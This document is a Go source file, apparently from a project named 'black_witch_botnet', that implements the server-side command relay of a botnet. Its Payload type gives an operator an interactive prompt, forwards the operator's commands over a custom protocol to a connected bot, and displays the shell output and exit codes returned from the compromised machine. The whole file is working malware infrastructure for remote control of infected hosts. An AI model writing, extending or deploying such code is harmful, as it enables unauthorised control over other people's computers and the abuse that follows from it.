package server

import (
	"black_witch_botnet/proto"
	"black_witch_botnet/relations"
	"bufio"
	"fmt"
	"github.com/gookit/color"
	"log"
	"net"
	"strings"
	"time"
)

type Payload struct {
	Addr net.Addr
	Conn net.Conn
}

func (p *Payload) Activate(conn net.Conn) {
	for {
		pre := color.Blue.Text(fmt.Sprintf("<%s:#> ", p.Addr.String()))
		// 	writer := bufio.NewWriter(conn) doesn't work
		conn.Write([]byte(pre))

		text, err := receive(conn)

		if err != nil {
			break
		}

		log.Printf("%s", text)

		switch text {
		case "":
			continue
		case "exit":
			return
		}

		req, err := parse(text)

		log.Printf("%T %v", req, req)

		if err != nil {
			conn.Write(append([]byte(err.Error()), '\n'))
			break
		}

		res, err := p.handle(req)

		log.Printf("%T %v", res, res)

		if err != nil {
			conn.Write(append([]byte(err.Error()), '\n'))
			break
		}

		o := dump(res)

		log.Printf("%s", o)

		err = send(o, conn)

		if err != nil {
			log.Println("[UNIX] Send unix output", err)
			break
		}
	}
}

func (p *Payload) write(res *proto.Package) error {
	writer := proto.NewWriter(p.Conn)
	err := writer.Write(res)

	if err != nil {
		return err
	}

	return nil
}

func (p *Payload) read() (*proto.Package, error) {
	p.Conn.SetReadDeadline(time.Now().Add(1 * time.Minute))

	reader := proto.NewReader(p.Conn)
	pack, err := reader.Read()

	if err != nil {
		return nil, err
	}

	return pack, nil
}

func (p *Payload) handle(i interface{}) (interface{}, error) {
	oPack, err := proto.Marshal(i)

	if err != nil {
		log.Printf("[PL] Error marshal package %s\n", err)
		return nil, err
	}

	err = p.write(oPack)

	if err != nil {
		log.Printf("[PL] Error write package %s\n", err)
		return nil, err
	}

	iPack, err := p.read()

	if err != nil {
		log.Printf("[PL] Error read package %s\n", err)
		return nil, err
	}

	res, err := proto.Unmarshal(iPack)

	if err != nil {
		log.Printf("[PL] Error unmarshal package %s\n", err)
		return nil, err
	}

	return res, nil
}

func dump(i interface{}) string {
	if res, ok := i.(*relations.ShellResult); ok {
		if res.Exit != 0 {
			return fmt.Sprintf("%sExit %d", res.Stderr, res.Exit)
		} else {
			return fmt.Sprintf("%s", res.Stdout)
		}
	}

	if res, ok := i.(*relations.EventResult); ok {
		return fmt.Sprintf("%s\nStatus %t", res.Data, res.Status)
	}

	if res, ok := i.(*relations.ErrorResult); ok {
		return fmt.Sprintf("%s\nError code %d", res.Data, res.Code)
	}

	return fmt.Sprintf("Unknown response\n%+v", i)
}

func send(o string, conn net.Conn) error {
	o = strings.TrimSpace(o)
	_, err := conn.Write(append([]byte(o), '\n'))
	return err
}

func receive(conn net.Conn) (string, error) {
	reader := bufio.NewReader(conn)
	text, err := reader.ReadString('\n')

	if err != nil {
		return "", err
	}

	text = strings.TrimSpace(text)
	return text, nil
}

func parse(text string) (interface{}, error) {
	p := &Parser{text}
	return p.Parse()
}
